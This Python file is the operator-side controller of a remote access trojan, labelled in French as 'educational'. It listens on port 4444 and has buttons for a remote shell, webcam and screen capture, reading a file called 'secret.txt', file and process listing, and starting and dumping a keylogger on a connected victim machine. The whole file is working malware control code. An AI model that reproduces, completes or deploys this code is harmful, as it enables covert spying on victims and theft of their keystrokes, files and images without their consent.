import socket
import threading
import io
from PIL import Image, ImageTk
import customtkinter as ctk
from protocol import send_data, receive_data, receive_base64

HOST = "0.0.0.0"
PORT = 4444

class RATGUI(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("RAT Pédagogique - Contrôle à Distance")
        self.geometry("900x600")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.client_socket = None
        self.client_address = None

        self.log_box = ctk.CTkTextbox(self, width=850, height=150)
        self.log_box.pack(pady=10)

        self.image_label = ctk.CTkLabel(self, text="")
        self.image_label.pack(pady=10)

        self.buttons_frame = ctk.CTkFrame(self)
        self.buttons_frame.pack(pady=10)

        self.add_button("Shell", self.send_shell)
        self.add_button("Webcam", self.send_webcam)
        self.add_button("Lire Fichier", self.send_read_file)
        self.add_button("Capture Écran", self.send_capture)
        self.add_button("Liste Fichiers", self.send_list_files)
        self.add_button("Processus", self.send_process)
        self.add_button("Keylogger", self.send_keylogger)
        self.add_button("Démarrer Keylogger", self.keylogger_start)
        self.add_button("Récupérer Logs", self.keylogger_dump)
        self.add_button("Déconnecter", self.send_disconnect)

        threading.Thread(target=self.wait_for_connection, daemon=True).start()

    def add_button(self, label, command):
        button = ctk.CTkButton(self.buttons_frame, text=label, width=130, command=command)
        button.pack(side="left", padx=5)

    def keylogger_start(self):
        self.send_command("keylogger_start")
        result = receive_data(self.client_socket).decode()
        self.log("[Keylogger ON]\n" + result)

    def keylogger_dump(self):
        self.send_command("keylogger_dump")
        result = receive_data(self.client_socket).decode()
        self.log("[Keylogger Logs]\n" + result)

    def log(self, text):
        self.log_box.insert("end", text + "\n")
        self.log_box.see("end")

    def send_webcam(self):
        self.send_command("webcam")
        data = receive_base64(self.client_socket)
        img = Image.open(io.BytesIO(data))
        img = img.resize((500, 300))
        photo = ImageTk.PhotoImage(img)
        self.image_label.configure(image=photo)
        self.image_label.image = photo
        self.log("[Webcam reçue]")

    def send_read_file(self):
        # Exemple simple : récupère 'secret.txt' dans le répertoire courant
        self.send_command("readfile secret.txt")
        data = receive_base64(self.client_socket)
        try:
            content = data.decode(errors="ignore")
            self.log("[Fichier reçu : secret.txt]\n" + content)
        except:
            self.log("[Fichier binaire ou erreur décodage]")

    def wait_for_connection(self):
        self.log("[*] En attente d'une connexion...")
        server_socket = socket.socket()
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        self.client_socket, self.client_address = server_socket.accept()
        self.log(f"[+] Client connecté : {self.client_address}")

    def send_command(self, cmd):
        if self.client_socket:
            try:
                self.client_socket.send(cmd.encode())
            except:
                self.log("[-] Erreur d'envoi de la commande.")
        else:
            self.log("[-] Aucun client connecté.")

    def send_shell(self):
        self.send_command("shell")
        result = receive_data(self.client_socket).decode()
        self.log("[Shell]\n" + result)

    def send_capture(self):
        self.send_command("screencap")
        data = receive_base64(self.client_socket)
        img = Image.open(io.BytesIO(data))
        img = img.resize((500, 300))
        photo = ImageTk.PhotoImage(img)
        self.image_label.configure(image=photo)
        self.image_label.image = photo
        self.log("[Capture d'écran reçue]")

    def send_list_files(self):
        self.send_command("listfiles")
        result = receive_data(self.client_socket).decode()
        self.log("[Fichiers]\n" + result)

    def send_process(self):
        self.send_command("process")
        result = receive_data(self.client_socket).decode()
        self.log("[Processus]\n" + result)

    def send_keylogger(self):
        self.send_command("keylogger")
        result = receive_data(self.client_socket).decode()
        self.log("[Keylogger]\n" + result)

    def send_disconnect(self):
        self.send_command("exit")
        self.client_socket.close()
        self.client_socket = None
        self.log("[Connexion fermée]")

if __name__ == "__main__":
    app = RATGUI()
    app.mainloop()
